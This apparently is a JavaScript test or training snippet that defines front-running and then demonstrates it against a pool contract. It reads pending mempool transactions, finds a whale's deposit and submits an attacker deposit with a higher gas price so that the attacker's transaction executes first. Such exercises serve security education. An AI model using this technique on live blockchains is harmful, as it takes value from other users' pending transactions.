// Frontrunning Attack Definition:
// A front-running attack occurs when a malicious user observes a transaction after a user broadcasts it and it is waiting in the mempool.
// The attacker then sends their own transaction for the motive of gaining some profit with higher gas fees.
// This will lead to the attackerâ€™s transaction being executed before the users.
// Commonly, a miner or bot will place their own transaction immediately in front of the pending transaction.

// Source: https://quillaudits.medium.com/front-running-and-sandwich-attack-explained-quillaudits-de1e8ff3356d

const WHALE_DEPOSIT = ethers.utils.parseEther("100");
const ATTACKER_DEPOSIT = ethers.utils.parseEther("1");

// Whale deposits
await this.pool.connect(whale).deposit(WHALE_DEPOSIT);

// Get pending transactions from the mempool
const pendingBlock = await ethers.provider.send("eth_getBlockByNumber", [
  "pending",
  true,
]);

// Find transaction destination is equal to the pool address
const whaleTransaction = pendingBlock.transactions.find(
  (tx) => tx.to.toLowerCase() == this.pool.address.toLowerCase()
);

// Attacker deposits before the whale by increasing the gas price
await this.pool.connect(attacker).deposit(ATTACKER_DEPOSIT, {
  gasPrice: ethers.BigNumber.from(whaleTransaction.gasPrice).add(1)
});
